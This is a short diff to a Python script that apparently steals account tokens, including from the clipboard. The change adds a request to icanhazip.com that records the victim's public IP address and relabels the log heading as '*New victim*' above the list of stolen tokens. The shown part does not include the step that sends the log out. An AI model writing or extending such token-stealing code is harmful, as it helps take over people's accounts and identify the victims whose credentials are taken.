@@ -35,7 +35,9 @@ get_tokens_from_clipboard()
 
 tokens = list(set(tokens))
 
-log = "*New log*\n"
+ip_address = f"\nIP:\n`{requests.get('https://icanhazip.com/').text}`\n"
+
+log = "*New victim*\n" + ip_address
 
 if len(tokens) != 0:
     tokens_string = '```Tokens:\n' + ('\n'.join(tokens)) + '```'
